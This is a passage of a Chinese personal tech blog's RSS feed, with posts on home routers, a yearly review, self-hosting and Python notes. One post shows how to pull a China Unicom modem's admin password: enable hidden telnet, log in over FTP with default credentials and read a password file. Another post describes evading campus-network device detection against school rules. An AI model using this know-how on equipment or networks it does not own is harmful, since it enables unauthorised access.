&lt;p>因为安装的时候需要配置 PVE 网络的网关，既然用了软路由肯定是要用 OpenWrt、爱快这种路由系统装到虚拟机里，所以在安装之前先规划一下虚拟机的 IP 分配问题。以我安装的 OpenWrt 为例。&lt;/p></description></item><item><title>中国联通SK-D748光猫超级密码获取</title><link>/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</link><pubDate>Wed, 04 Jan 2023 00:00:00 +0000</pubDate><guid>/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</guid><description>&lt;p>折腾软路由百忙之中抽时间来简单&lt;del>水&lt;/del>一篇。&lt;/p>
&lt;p>有这个需求是因为目前在家里是用另一个无线路由器桥接联通的光猫的，但是在dhcp 里死活找不到桥接路由器分配的 ip，然后插上软路由竟然又把 ip 分配给软路由了，真是不服不行。&lt;/p>
&lt;p>之前装联通宽带的时候尝试过找师傅要超级管理员的密码，但是师傅给我打哈哈糊弄过去了，给的一个普通 user 用户并没有静态 ip 的权限，所以就去网上找教程了，自己记录一下。&lt;/p>
&lt;p>原文地址：&lt;a href="https://www.right.com.cn/forum/thread-8253868-1-1.html">https://www.right.com.cn/forum/thread-8253868-1-1.html&lt;/a>&lt;/p>
&lt;p>设备型号 SK-D748-C&lt;/p>
&lt;h2 id="第一步">第一步&lt;/h2>
&lt;p>保证可以局域网内正常访问联通光猫的管理界面。比如我的光猫地址为 192.168.1.1&lt;/p>
&lt;h2 id="第二步">第二步&lt;/h2>
&lt;p>打开隐藏配置界面：&lt;a href="http://192.168.1.1/hidden_version_switch.html">http://192.168.1.1/hidden_version_switch.html&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://img.braindance.top/article/2023/01/04/63b53083b2580.png" alt="1672818822972.png">&lt;/p>
&lt;p>勾选图中的 Telnet Enable 选项，网页会刷新一下，接下来测试一下光猫的 telent 是否成功打开。&lt;/p>
&lt;p>开始 - 运行 - cmd，运行 &lt;code>telnet 192.168.1.1&lt;/code> 提示输入登陆用户名称视为成功。&lt;/p>
&lt;h2 id="第三步">第三步&lt;/h2>
&lt;p>使用 ftp 连接光猫，默认的账号密码是 &lt;code>useradmin/useradmin&lt;/code> ，在 &lt;code>/var/tmp&lt;/code> 目录下的 &lt;code>telnet_su_passwd&lt;/code> 文件就是管理员密码。&lt;/p>
&lt;p>&lt;img src="https://img.braindance.top/article/2023/01/04/63b533f299fab.png" alt="1672819703315.png">&lt;/p>
&lt;p>我最后获得的密码格式是：前半段是光猫默认的 wifi 密码，从 CUAdmin 开始到后面一串数字是超级管理员的登陆密码&lt;/p>
&lt;p>超级管理员用户名是 CUAdmin&lt;/p>
&lt;h2 id="其他说明">其他说明&lt;/h2>
&lt;ul>
&lt;li>不要尝试在 ftp 里随意删除软件，可能导致设备异常&lt;/li>
&lt;li>获取超级管理员权限后，修改任何设置前自行评估有无风险。&lt;/li>
&lt;/ul></description></item><item><title>2022年度总结</title><link>/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link><pubDate>Sat, 31 Dec 2022 00:00:00 +0000</pubDate><guid>/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid><description>&lt;p>今年过得可真是太快了，不知道从哪开始写。前几天不小心点开微博，首页一句话想想只能苦笑一下，所有人应该都过得差不多吧。今年我乱过的，明年我一定好好过。&lt;/p>
&lt;h2 id="学业">学业&lt;/h2>
&lt;p>可能到现在也不知道当时为了什么考研，可能就是觉得听了大环境下找工作不容易，自己觉得在本科学校体验不太好，想上个像样的大学，考前一阵子还记得说过：XXX（自己学校）狗都不来，现在调剂回本校了，到考前一天所有的书可能连一遍都没过完，数学只能说本科那几门都没整明白。本来目标也没多高，到调剂的时候一降再降，算了，有学上就行不挑了。&lt;/p>
&lt;p>现在只要是个计算机专业研究生基本上都逃不过人工智能的大门，无论是什么方向都会往上面靠，可能这就是大势所趋吧，我反正只能提起半个兴趣，也许我对所有东西都只能提起半个兴趣。人工智能又是和数学挺有关联的，自己考研数学都没整好，现在学的一门人工智能数学真的是边看边摇头。出来混迟早要还的。&lt;/p>
&lt;p>然后学校的培养计划是学硕专硕都要发文章，本来自己的表达能力都不太行，又想了想自己本科的毕业设计论文，既来之则安之吧。&lt;/p>
&lt;h2 id="新冠疫情">新冠疫情&lt;/h2>
&lt;p>好像就是今年年初的时候开开始全员核酸，然后大四最后在学校基本上过两天就要下去排个队，然后学校组织的又不行，基本上一下去就要一个半小时在那站着，所以我基本上都是踩着尾去的。今年过得如此的快跟这个全员核酸和封闭逃不了干系，天天坐在屋子里面，一晃一天过去了，天天就跟乌龟一样都没动过，自己也没怎么运动过。&lt;/p>
&lt;p>然后年底阵子封控放开了，家里亲戚和认识的人基本都阳了个遍，我在家发烧了两波，刚好还都是在线上考试之后，有一晚上真是烧的顶不住了，半夜起来手机放旁边听歌还觉得好受了点，写这篇总结的时候已经差不多完全好了。就这样吧，反正也放开了，以后说不定就再也没有新冠疫情导致各种封闭了，在后头的好日子应该快来了吧啊？&lt;/p>
&lt;h2 id="家人">家人&lt;/h2>
&lt;p>之前还会担心爸妈会在我不在家的时候家里闹矛盾什么的，现在感觉爸妈快退休了还是心态变了，现在俩人也会吵就是很快就笑了，这样子我在学校的时候也不会太担心了，总之确实跟之前也有很大的变化，希望身体都健健康康的就好。&lt;/p>
&lt;p>我姐年底的时候出国读博了，就如我姐之前说的她是真的惨，从幼儿园开始连着上了 30 年学，不过这应该也就是最后了，以她的专业，只要能顺利毕业接下来真就是好日子了。&lt;/p>
&lt;h2 id="毕业">毕业&lt;/h2>
&lt;p>现在想想有点怀念本科最后做毕设那会，事也不算多，和其他的好几个宿舍天天都有联动活动，有点想起来小时候跟发小在外面疯一样，那种感觉真的是久违了。宿舍里两个去工作了，剩下三个考研只有我姑且算是考上了，但是我感觉他们每一个都比我努力的多，今年也都二战了，在这里祝他们都成功上岸吧，以后各自也都有自己的路要走了，这一次分别谁知道一下次会在哪见面，各位天山路远，山高水长，后会有期，江湖再见。&lt;/p>
&lt;h2 id="感情">感情&lt;/h2>
&lt;p>算是失败过一次吧，但是也不算，反正现在性格小开阔一下，至少不像之前那样跟没见过女人一样 (😎👉😭🕶️) 年纪也快到了，爸妈开始正式跟我说这个问题了，之前从来都是闭口不谈，还声称我谈恋爱给我恋爱经费，但是我一个臭打游戏的，买个游戏都要蹲打折才行，这一点也得改一改。然后就是确实有点不懂人情世故，我要是女的我都觉得这个人看起来不太聪明有点妈宝的感觉。以后一个一个改吧，不然真就是相亲硬过日子了，感觉自己也是条件不咋地要求还挺高，到现在也没遇到真能豁出去的，自己也要胆大一些。&lt;/p>
&lt;h2 id="自己的想法">自己的想法&lt;/h2>
&lt;p>昨天晚上高中同学回来了，一起遛弯聊了聊，他对他现在的工作挺不满意的想换了，想了下我再过两年就也该找工作了，但是天天只顾得上自己学和玩，除了程序员这一条路，其他能干啥也不知道，等到时候年纪大了被顶掉了咋办？确实想太多也会让步伐变慢，带着这个问题等遇到新信息再想吧。我也又一次确认了一下自己努力的目标就是为了到将来的时候能过得轻松点就很满足了。&lt;/p>
&lt;p>最近几个月买了个软路由，还应验了之前一篇文章里写的，过年别人在出去吃喝，我在家里折腾黑盒子，问我收获了什么，就是组了一个 all in one 看视频不要广告 blablabla，自己随地就可以魔法，父母只是沉默不语，看着自己家的电表转的又快了。哈哈哈&lt;/p>
&lt;p>自从从去年7 8月份加入了实验室吧，我就每天把自己安排的满满当当，从早上到晚上每一件事都用尽全力，不管是打游戏还是去学习和折腾些技术，感觉一点其他的时间都没有给自己留，一直都是火力全开往前走也没有停下来好好想一想，前几天在电视上也看到了一个广告，一个老奶奶教自己孙女画画说道：“画画要留白，人生也一样，不要把生活填得太满，多给自己留些空间”。也觉得这样排的满满当当自己有点吃不消了，而且好多东西也有点力不从心，开始变得有些木讷了，明年就先学学会劳逸结合，但是效率还是不能丢。&lt;/p>
&lt;hr>
&lt;p>现在是 22年12月31日23点25分，赶在这一年的最后把总结写出来了，就这样吧，今年确实过得听梦幻的，最近这三年都听梦幻的，翻了一遍相册也是没有什么大事可回忆的，平平淡淡也挺好的吧。&lt;/p>
&lt;p>再见 2022 ！&lt;/p></description></item><item><title>ZUT 使用路由器连接校园网</title><link>/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/</link><pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate><guid>/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>我们学校的校园网不光每个月要宽带费 20/月，而且要绑定一个校园卡，我的一个月月租下来要 49/月，而且校园网还限制设备数量只能连接一个，我一般都是电脑连校园网，手机用流量，但是教职工的校园网就可以两个设备连接，寝室里目前有6+个设备也需要联网，商量以后打算搞个路由器贡献一个账号连校园网开 wifi，之前就见贴吧有老哥已经成功了，所以自己也尝试一下做个记录，给以后的同学看也不错。由于我已经连好路由器了，所以部分图片取自网络图片作为参考，我也尽量说的详细些。&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>对于任何硬件、软件的损坏，本人没有赔偿的责任，哪怕这样的后果是因教程中的错误造成的。也请认真对待每一步操作，也许因为你的操作不当硬件因此变成一块砖。另外本教程的操作会使你的路由器失去保修。&lt;/li>
&lt;li>本篇文章仅起指导性的作用，在操作的过程中遇到的问题也许我也没有遇到过，请先自行尝试解决，如果我有空也会尽量帮助。&lt;/li>
&lt;li>学校明令禁止安装路由器，本人绝对没有怂恿或建议任何同学安装路由器，本人安装路由器的行为完全属于个人意志，仅仅作为个人的学习技术交流，请读者在安装好路由器之后 24 小时内再将之拆除，请按照学校指明的方式连接到互联网。如果学校根据校规等文件追究责任，与本人无关。&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;p>叠甲过&lt;/p>
&lt;h2 id="前置知识">前置知识&lt;/h2>
&lt;p>校园网插入网线认证是要模拟 Dr.com 软件的发包认证，除了账号密码认证校园网以外，软件还会定时发送心跳包保证校园网连接。&lt;/p>
&lt;p>zut 的校园网认证格式为账号：&lt;code>\r\n你的学号@[unicom|telecom|cmcc]&lt;/code> ，其中 &lt;code>@&lt;/code> 后面的是你的运营商，对照前面的格式分别为：联通、电信、移动，例如我的是联通校园网，账号就是：&lt;code>\r\n2022********@unicom&lt;/code>，密码就是你自己的密码。&lt;/p>
&lt;p>zut 校园网的客户端版本为：6.0.0（P）&lt;/p>
&lt;p>校园网的防检测插件原理还没有写，自己用的 小米4C 是社区固件资源中自带的。想看原理可以看最后挖坑部分&lt;/p>
&lt;h2 id="需要的材料">需要的材料&lt;/h2>
&lt;p>本教程使用的路由器型号 &lt;code>Xiaomi router 4c&lt;/code> pdd二手35，安装的系统 &lt;code>openwrt&lt;/code>。&lt;strong>请注意&lt;/strong>：路由器的选择直接影响到你后面的操作，我专门在网上挑了好久选的这个路由器，但是，&lt;strong>唯独这个路由器的社区资源最特殊&lt;/strong>，本人也是经过各种尝试才成功。如果选择其他路由器，本教程中的主要安装思路相同，但是需要自行寻找适合自己路由器的固件资源。&lt;/p>
&lt;ul>
&lt;li>路由器。&lt;/li>
&lt;li>网线两根。一根我买的8m的，因为宿舍AP在门上面，另一根需要连接路由器和电脑，长度自己看。&lt;/li>
&lt;li>开通校园网的账号。&lt;/li>
&lt;li>自己思考的能力。&lt;/li>
&lt;li>需要的软件压缩包：&lt;a href="https://wwn.lanzouy.com/igsaW0dn0k3a">zut_Xiaomi_router_4c.zip&lt;/a>。其中包含
&lt;ul>
&lt;li>dogcom.zip。用来进行校园网模拟拨号，定时发送心跳包的工具。&lt;/li>
&lt;li>R3GV2 patches.zip。刷机的主要部分包含了：R3GV2 patches（前期连接路由器的工具）、Mi4C.bin（小米 4c 的 openwrt 固件自带防检测插件）、breed.bin（breed web 恢复控制台）&lt;/li>
&lt;li>MobaXterm_Portable.zip。用来连接路由器和传输文件的软件&lt;/li>
&lt;li>小米路由器4C恢复官方固件工具包.zip。刷成砖的&lt;a href="https://web.vip.miui.com/page/info/mio/mio/detail?postId=19134127&amp;amp;app_version=dev.20051">官方补救措施&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="教程参考的网站或资料">教程参考的网站或资料&lt;/h2>
&lt;ul>
&lt;li>贴吧老哥的教程：&lt;a href="https://tieba.baidu.com/p/7760362347">https://tieba.baidu.com/p/7760362347&lt;/a>&lt;/li>
&lt;li>广东工业大学在 github 上的教程：&lt;a href="https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt">https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt&lt;/a>&lt;/li>
&lt;li>【记录】小米路由器 4C 刷机过程：&lt;a href="https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27">https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27&lt;/a>&lt;/li>
&lt;li>R4CM，说说我的小米路由器4C刷机过程：不用Linux也不用虚拟机…… ：&lt;a href="https://www.right.com.cn/FORUM/thread-4047571-1-1.html">https://www.right.com.cn/FORUM/thread-4047571-1-1.html&lt;/a>&lt;/li>
&lt;li>路由器认证校园网drcom：&lt;a href="https://www.brothereye.cn/router/669/">https://www.brothereye.cn/router/669/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="开工">开工&lt;/h2>
&lt;p>接通路由器电源，&lt;strong>使用网线连接路由器&lt;/strong>，进入初始化管理页面通常是 &lt;code>192.168.1.1&lt;/code>，能跳过就跳过，下图右选择无需拨号即可。（网络图片仅供参考）&lt;/p>
&lt;p>&lt;img src="https://img.braindance.top/article/2022/10/11/63450a2f460ac.png" alt="ab3pm-21hcz.png">&lt;/p>
&lt;p>接下来设置 wifi 名称和密码，可以勾选管理密码和 wifi 密码相同的框，保存以后会提示新的管理后台地址，通常是 &lt;code>192.168.31.1&lt;/code>，使用管理密码登陆以后，显示路由器界面就算初始化成功。&lt;/p></description></item><item><title>KKapi+ISpeak说说页面部署</title><link>/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/</link><pubDate>Tue, 04 Oct 2022 00:00:00 +0000</pubDate><guid>/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>感觉原来的 Artitalk 说说不好康，在开往里发现好多博客都用的说说功能叫叨叨点啥，看了看作者的&lt;a href="https://www.antmoe.com/speak/">说说页面&lt;/a>，可以插入图片和标签分类，还有仅自己可见的功能，感觉挺不错的（实际是自己想折腾）所以就整一个。自己在部署过程中实在是踩了不少的坑，而且作者的文档感觉写的也不算完善，所以打算自己记录一下。&lt;/p>
&lt;h2 id="项目结构">项目结构&lt;/h2>
&lt;p>作者的文档中各种仓库链接属实给我跳晕了，最后理出来的项目分为以下部分：&lt;/p>
&lt;ul>
&lt;li>&lt;code>kkapi&lt;/code>。是作为说说的后端部分，连接 MongoDB 数据库，还有一个&lt;code>kkadmin&lt;/code>的管理页面&lt;/li>
&lt;li>&lt;code>ISpeak&lt;/code>。说说的主体部分，依赖于后端的 &lt;code>kkapi&lt;/code> ，分为前端的展示页面，和一个对接后端的发布说说页面。&lt;/li>
&lt;/ul>
&lt;p>作者文档中给出很多部署方法，白嫖版的就是 vercel 后端 api + 管理界面 + MongoDB 提供的云服务，但是个人感觉 vercel 经常被墙，所以部署的 api 感觉也不会稳定，而且考虑到数据的存放问题，所以我选择的是都部署到自己服务器上。&lt;/p>
&lt;h2 id="后端部署">后端部署&lt;/h2>
&lt;h3 id="docker-安装-mongodb">Docker 安装 Mongodb&lt;/h3>
&lt;p>安装可以参考菜鸟教程的 &lt;a href="https://www.runoob.com/docker/docker-install-mongodb.html">Docker 安装 MongoDB&lt;/a> 。因为之前听过 MongoDB 的未授权访问，所以考虑到安全性问题，创建容器的时候添加 &lt;code>MONGO_INITDB_ROOT_USERNAME&lt;/code> 和 &lt;code>MONGO_INITDB_ROOT_PASSWORD&lt;/code> 设置用户的账号密码，开启Docker MongoDB 的身份验证。考虑到数据未来的迁移可以通过 &lt;code>-v&lt;/code> 挂载宿主机的一个目录。可以修改默认端口再减少一些风险。最后我启动的命令如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker run -d --name mongodb &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>	-p xxxxx:27017 &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>	-v /my/own/datadir:/data/db &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>	-e MONGO_INITDB_ROOT_USERNAME&lt;span style="color:#f92672">=&lt;/span>mongoadmin &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>	-e MONGO_INITDB_ROOT_PASSWORD&lt;span style="color:#f92672">=&lt;/span>secret &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>	--restart&lt;span style="color:#f92672">=&lt;/span>always
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	mongo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后可以使用工具测试一下连接。&lt;/p>
&lt;h3 id="kkapi-部署">kkapi 部署&lt;/h3>
&lt;p>和项目文档中的教程差不多，要注意使用的 node 版本请高于 &lt;code>16.0.0&lt;/code>&lt;/p></description></item><item><title>近期总结</title><link>/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/</link><pubDate>Wed, 10 Aug 2022 18:39:26 +0800</pubDate><guid>/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/</guid><description>&lt;p>水一篇文章，写写最近干了啥&lt;/p>
&lt;h2 id="onenav">Onenav&lt;/h2>
&lt;p>一直想找一个导航页的网站，自己天天用书签栏用的找不到太烦了。之前用过webstack主题的网站，本来是直接写源码上的，后来自己做了一个用js读配置文件加载的，但是加网站的时候要手改数据文件。
最后发现了正在用的导航页&lt;a href="https://github.com/helloxz/onenav">onenav&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>OneNav是一款开源免费的书签（导航）管理程序，使用使用PHP + SQLite 3开发，界面简洁，安装简单，使用方便。OneNav可帮助你你将浏览器书签集中式管理，解决跨设备、跨平台、跨浏览器之间同步和访问困难问题，做到一处部署，随处访问。&lt;/p>&lt;/blockquote>
&lt;p>这个程序提供了后台管理的面板，添加网站的时候也能自己识别网站的title和description，还提供了好几个主题。下面是我网站的一部分，总之用起来还挺不错
&lt;img src="https://img.braindance.top/article/2022/08/10/62f36c3a7fccb.png" alt="1660120122763.png">
踩的坑：官方文档里只提供了两个网站，但是在演示站找到了五六个，官方也提供了主题的下载和配置，但是需要订阅服务一年19.9，&lt;del>因为我是白嫖怪&lt;/del>，就自己去找源码了&lt;/p>
&lt;p>&lt;a href="https://gitee.com/baisucode/onenav-theme">baisu&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://gitee.com/baisucode/baisu-two">baisu-two&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/imsyy/OneNav">Webstack&lt;/a>&lt;/p>
&lt;p>找到源码需要改主题的资源地址，主题默认使用的onenav的旧变量&lt;code>TEMPLATE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script src=&amp;#34;templates/&amp;lt;?php echo TEMPLATE; ?&amp;gt;/js/jquery-3.5.1.min.js&amp;#34; type=&amp;#34;text/javascript&amp;#34; charset=&amp;#34;utf-8&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>最新版本已经不再使用配置文件中的&lt;code>TEMPLATE&lt;/code>转而为&lt;code>$template&lt;/code>存储，修改以后样式就正常加载了。&lt;/p>
&lt;h2 id="域名">域名&lt;/h2>
&lt;p>一直因为没有一个com的域名感到遗憾，最近看间谍过家家，记得阿尼亚和玩偶玩过家家的时候，有一只企鹅的名字就叫：[ペんぎんマン ]^(penginman)并且pingin的日语发音和企鹅penguin相似。于是有了这个域名
&lt;a href="https://www.penginman.com">www.penginman.com&lt;/a>&lt;/p>
&lt;h2 id="mdserver-web">mdserver-web&lt;/h2>
&lt;p>&lt;a href="https://github.com/midoks/mdserver-web">mdserver-web&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>简单的Linux面板,感谢BT.CN写出如此好的web管理软件。我一看到，就知道这是我一直想要的页面化管理方式。 复制了后台管理界面，按照自己想要的方式写了一版。&lt;/p>&lt;/blockquote>
&lt;p>一个把宝塔面板样式照搬过来的Linux管理面板，感觉现在也不是特别成熟，但是其他面板也没有太顺手的，为什么不用宝塔面板，因为之前报过&lt;a href="https://github.com/aaPanel/BaoTa/issues/102">关于网传信息泄露问题&lt;/a>，我就是洁癖精。&lt;/p>
&lt;h2 id="图床">图床&lt;/h2>
&lt;p>之前用过一个Chevereto的图床，但是在国内服务器上部署，然后不想域名备案，所以访问老有问题。心血来潮在github上搜到了这两个项目&lt;/p>
&lt;p>&lt;a href="https://github.com/lsky-org/lsky-pro">Lsky Pro&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/XPoet/picx">PicX&lt;/a>&lt;/p>
&lt;h3 id="lsky-pro">Lsky Pro&lt;/h3>
&lt;p>这个主要发现支持对象存储，之前有篇文章说以后已经把网站的图片存到腾讯云COS了，所以用这个主要充当一个图床上传的工具，还加了一个本地存储策略随便存点东西。上传以后也是可以复制各种类型。
&lt;img src="https://img.braindance.top/article/2022/08/10/62f37bb2cd17f.png" alt="1660124082006.png">
还可以在后台直接管理图片。具体的就看仓库的演示图吧。&lt;/p>
&lt;h3 id="picx">PicX&lt;/h3>
&lt;p>这个用来传一些不大重要的图片把，也算是能用，还是用github当图床的，只是jsdelivr国内经常挂，所以加了两个其他的CDN访问。&lt;/p>
&lt;h2 id="显示器">显示器&lt;/h2>
&lt;p>开始觉得屏幕小了，也去换了个眼镜还是感觉不好使，上一个眼镜看东西已经有点白了，&lt;del>主要是打派找人太费劲了&lt;/del>，而且已经研究生了，未来看文献也挺不错，打算奖励一个显示器爽爽。去网吧体验了一波27寸，又在网上恶补了一阵子知识，最后相中了AOC Q27G2S/D，趁着打折入了手，买东西的时候还发现京东太会了，我下了个单想看看哪个支付方式能再优惠点就取消，取消的时候选择了少用优惠券，弹出来的页面又领了50块大洋！！！😎😎😎又省一波。
到手送的一跟DP线，发现电脑没有口，只有一个HDMI和两个Mini DP，家里有一根HDMI的好像有问题，帧数高的时候就会花，又在网上买了一个Mini DP转DP，还是同一个快递员给我送的，快递员还认出来我了，怪不好意思的。&lt;/p>
&lt;h2 id="markdown编辑器">Markdown编辑器&lt;/h2>
&lt;p>最近发现Typora老版本不能用了，而且官方出了正式版需要付费，就找另外找了几个软件：&lt;/p>
&lt;ul>
&lt;li>Notion
这个软件感觉用来每个段落排版比较不错，但是windows端是个网页的套壳，而且国内正常好像还访问不了，用过一阵子换了&lt;/li>
&lt;li>Obsidian
也挺不错的软件，可以在多个文章直接加上双向链接，还有脑图什么的，而且开源的插件社区，但是就是因为功能太多了感觉有点复杂&lt;/li>
&lt;li>MarkText
很清爽的一个界面，但是目前还没支持中文。&lt;/li>
&lt;li>Joplin
最后选择用的。界面清爽、管理笔记也挺不错，主要发现了有可以自己部署私有云笔记，下一步折腾这个。&lt;/li>
&lt;/ul>
&lt;h2 id="软路由">软路由&lt;/h2>
&lt;p>先放一个骚话生成器项目里的模板&lt;/p>
&lt;blockquote>
&lt;p>快过年了，不要再讨论什么NAS、HTPC、OpenWrt之类的了。你带你的大机箱回到家并不能给你带来任何实质性作用，朋友们兜里掏出一大把钱吃喝玩乐，你默默的在家里摆弄你的破群晖。亲戚朋友吃饭问你收获了什么，你说我组了一个RAID 0的ALL IN ONE，亲戚们懵逼了，你还在心里默默嘲笑他们，笑他们不懂你的刮削器，不懂你的Auto Backup，也笑他们看爱奇艺还要忍受会员专属广告。你父母的同事都在说自己的子女一年的收获，儿子买了个房，女儿买了个车，姑娘升职加薪了，你的父母默默无言，说我的儿子装了个黑盒子，开起来嗡嗡响、家里电表走得越来越快了。&lt;/p>&lt;/blockquote>
&lt;p>我感觉我要走前辈走过的路了，所以还有个念想就是整一个ALL IN ONE耍一耍，目前没有资金，看中了一个N5105的小主机标价888，等研究生发现工资了，整一个鼓捣鼓捣。&lt;/p></description></item><item><title>Python-Day-100 笔记</title><link>/posts/python%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate><guid>/posts/python%E7%AC%94%E8%AE%B0/</guid><description>&lt;h2 id="函数">函数&lt;/h2>
&lt;h3 id="函数的参数">函数的参数&lt;/h3>
&lt;p>可以使用可变参数&lt;code>def func(*args)&lt;/code>，参数前面的&lt;code>*&lt;/code>代表&lt;code>args&lt;/code>是一个可变参数。&lt;/p>
&lt;h3 id="用模块管理函数">用模块管理函数&lt;/h3>
&lt;p>每个文件代表一个模块，不同模块的函数命名可以相同，但是如果如下代码引用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module1 &lt;span style="color:#f92672">import&lt;/span> foo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module2 &lt;span style="color:#f92672">import&lt;/span> foo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>foo()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>程序会调用最后一个调用的&lt;code>foo&lt;/code>函数。
如果导入模块中除了定义的函数以外有可执行的代码，则Python解释器在导入这个模块时就会执行这些代码。可以利用只有被Python解释器直接执行的模块的名字才是 &lt;strong>__main__&lt;/strong> 进行判断&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># __name__是Python中一个隐含的变量它代表了模块的名字&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 只有被Python解释器直接执行的模块的名字才是__main__&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;call foo()&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> foo()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在其他模块再导入上述模块时，if条件中的语句就不会执行&lt;/p>
&lt;h3 id="变量作用域">变量作用域&lt;/h3>
&lt;p>Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索。内置作用域及python内置的标识符如：&lt;code>input&lt;/code>、&lt;code>print&lt;/code>、&lt;code>int&lt;/code>。
可以使用&lt;code>global&lt;/code>关键字来指示局部函数中的变量来自&lt;strong>全局变量&lt;/strong>，&lt;code>nonlocal&lt;/code>关键字表示变量来自&lt;strong>外部嵌套函数内的变量&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对&lt;a href="https://zh.wikipedia.org/zh-hans/%E5%BE%97%E5%A2%A8%E5%BF%92%E8%80%B3%E5%AE%9A%E5%BE%8B">迪米特法则&lt;/a>的践行。&lt;/p>&lt;/blockquote>
&lt;h2 id="字符串和常用数据结构">字符串和常用数据结构&lt;/h2>
&lt;h3 id="字符串">字符串&lt;/h3>
&lt;p>反斜杠&lt;code>\&lt;/code>用来转义。
&lt;code>\&lt;/code>后面可以跟八进制和六进制来表示字符，&lt;code>\u68d2&lt;/code>使用unicode字符编码表示字符。
